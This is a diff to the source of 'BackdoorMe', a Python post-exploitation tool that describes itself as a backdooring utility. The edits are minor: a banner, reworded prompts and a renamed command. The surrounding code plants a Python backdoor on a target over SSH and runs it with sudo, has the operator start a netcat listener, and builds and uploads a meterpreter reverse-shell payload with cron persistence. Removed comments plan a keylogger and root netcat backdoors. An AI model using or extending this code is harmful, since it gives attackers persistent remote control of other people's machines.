@@ -5,13 +5,7 @@ import target
 from colorama import *
 from Tkinter import *
 import cmd
-# TODO: TEST LIKE FUCK
-
-# TODO: Add option to specify (and pick a default) a more secret location to copy over files instead of the home directory
-# TODO: Clean up backdoors into folders (metasploit, python, netcat, etc) - Netcat doesn't have any files, and the perl and python ones should be completely in a folder
-# TODO: perl and python both will not work unless given an account with root. We could give the user an option of whether the account has root.
-# TODO: Give netcat root
-# TODO: Keylogger
+from start import ascii
 
 GOOD = Fore.GREEN + " + " + Fore.RESET
 BAD = Fore.RED + " - " + Fore.RESET
@@ -31,11 +25,11 @@ class BackdoorMe(cmd.Cmd):
         proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
         self.localIP = proc.stdout.read()
         self.localIP = self.localIP[:-1]
-        
+        ascii()
         print "Welcome to BackdoorMe, a backdooring utility. Type \"help\" to see the list of available commands."
+        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
         print "Using local IP of %s." % self.localIP
-        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target"
-
+        
     def do_addtarget(self, args):
         hostname = raw_input('Target Hostname: ') #victim host
         try:
@@ -156,7 +150,7 @@ class BackdoorMe(cmd.Cmd):
         fileToWrite.close()
         raw_input("Run the following command: nc -v -n -l -p 53922 in another shell.")
         self.curtarget.ssh.exec_command('rm pythBackdoor.py')
-        self.curtarget.scpFiles('pythScript/pythBackdoor.py', recur=False)
+        self.curtarget.scpFiles(self, 'pythScript/pythBackdoor.py', False)
         print("Moving the backdoor script.")
         self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup python pythBackdoor.py")
         print(GOOD + "Python backdoor on 53922 attempted.")
@@ -169,7 +163,7 @@ class BackdoorMe(cmd.Cmd):
             return
 
 
-        cron = (raw_input("  + Press y to start backdoor as a cronjob (recommended): ") == 'y')
+        cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
         #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
         os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f elf X -o initd" % self.localIP)
         self.curtarget.scpFiles('initd', False)
@@ -217,8 +211,6 @@ class BackdoorMe(cmd.Cmd):
         print "Exiting"
         exit()
 
-    #TODO: Improve this output
-    #TODO: Add info for which target is current target
     def do_list(self, args):
         print "Targets: "
         for num, t in self.targets.iteritems():
@@ -232,9 +224,8 @@ class BackdoorMe(cmd.Cmd):
         self._hist    = []      ## No history yet
         self._locals  = {}      ## Initialize execution namespace for user
         self._globals = {}
-    def do_hist(self, args):
+    def do_history(self, args):
         print self._hist
-
     def do_exit(self, args):
         return -1
     def precmd(self, line):
@@ -247,6 +238,7 @@ class BackdoorMe(cmd.Cmd):
             print e.__class__, ":", e 
  
     def do_EOF(self, line):
+        print ""
         return True
     def emptyline(self):
         return
